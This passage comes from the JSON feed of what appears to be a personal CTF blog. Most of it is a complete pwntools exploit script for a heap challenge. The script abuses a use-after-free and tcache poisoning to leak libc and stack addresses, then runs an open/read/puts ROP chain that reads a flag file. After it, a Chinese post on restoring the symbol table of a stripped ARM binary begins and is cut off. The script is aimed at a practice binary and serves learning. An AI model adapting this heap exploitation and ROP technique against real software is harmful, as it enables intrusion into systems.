comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Choice: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele_</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-8</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-6</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>stdout <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x128</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "堆拓展攻击",
                "orw",
                "堆栈结合"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/05/10/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B/",
            "url": "https://yhuanhuan01.github.io/2024/05/10/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B/",
            "title": "关于恢复符号表这件事",
            "date_published": "2024-05-10T08:12:12.000Z",
            "content_html": "<p>目标文件：</p>\n<pre><code class=\"language-file\">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n</code></pre>\n<p>32 位 ARM 架构，静态连接。内核版本 GUN/Linux 2.6.32 | 去符号表</p>\n<blockquote>\n<p>对于修复程序我们首先要准备一个拥有完全符号的程序，使用一些方法给他导出符号表。</p>\n</blockquote>\n<p>因此，我们需要去编译一个与其类似的程序，用 ida 插件 rizzo，去生成其符号表内容</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 文件名: hello_arm.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, ARM World!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编译内容如下：</p>\n<blockquote>\n<p><code>arm-linux-gnueabihf-gcc -static -march=armv7-a -mfloat-abi=hard -o myapp hello_arm.c</code></p>\n</blockquote>\n<blockquote>\n<p>myapp: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.31, 